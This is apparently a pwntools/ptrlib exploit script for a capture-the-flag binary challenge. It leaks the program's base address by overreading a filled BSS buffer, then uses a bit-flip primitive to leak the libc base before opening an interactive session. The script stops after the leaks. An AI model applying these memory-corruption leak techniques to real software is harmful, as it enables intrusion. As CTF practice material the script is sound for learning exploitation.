#!/usr/bin/env python
import sys
import ptrlib as ptr
import pwn

exe = ptr.ELF("./prob_patched")
pwn.context.binary = pwn.ELF(exe.filepath)
libc = ptr.ELF("./libc.so.6")
# ld = ptr.ELF("")


def connect():
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        return pwn.remote("localhost", 5000)
    else:
        return pwn.process(exe.filepath)


def unwrap(x):
    if x is None:
        ptr.logger.error("Failed to unwrap")
        exit(1)
    else:
        return x


def main():
    io = connect()

    def send_to_bss(data: bytes, line=True) -> bytes:
        io.send(b"1")
        io.recvuntil(b":=  ")
        dump = io.recvuntil(b">> ", drop=True)
        io.sendline(data)
        return dump

    def bit_flip(offset: int, bit: int):
        io.sendline(b"2")
        io.sendlineafter(b"offset: ", str(offset).encode())
        io.sendlineafter(b"bit index (7 ~ 0): ", str(bit).encode())

    send_to_bss(b"A" * 0x1000)
    exe.base = ptr.u64(send_to_bss(b"B").split(b"A" * 0x1000)[1][0:6]) - 0x2008

    input(">> ")
    bit_flip(0x30, 6)
    io.recvuntil(b"after byte:")
    io.recvline()

    libc.base = ptr.u64(io.recv(6)) - 0x620D0


    io.interactive()
    return


if __name__ == "__main__":
    main()
